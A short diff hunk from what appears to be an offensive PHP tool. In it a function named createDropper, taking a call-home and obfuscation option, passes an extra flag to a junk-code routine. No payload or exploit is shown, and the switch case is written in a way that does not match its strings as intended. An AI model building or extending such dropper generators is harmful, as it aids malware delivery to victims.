@@ -226,11 +226,11 @@ function createDropper($callHome, $duration, $extras, $obfsucate){
             switch (strtolower($obfsucate)){
                 case "o"||"y"||"yes":
                     print("Generated dropper will be: {$ob}\n");
-                    $t->begin_junk($file_in, "1", $ob);
+                    $t->begin_junk($file_in, "1", $ob, "ob");
                     break;
                 default:
                     print("Generated Dropper will be: {$n}\n");
-                    $t->begin_junk($file_in, "1", $n);
+                    $t->begin_junk($file_in, "1", $n, "n");
             }
 
         }catch (Exception $exception){
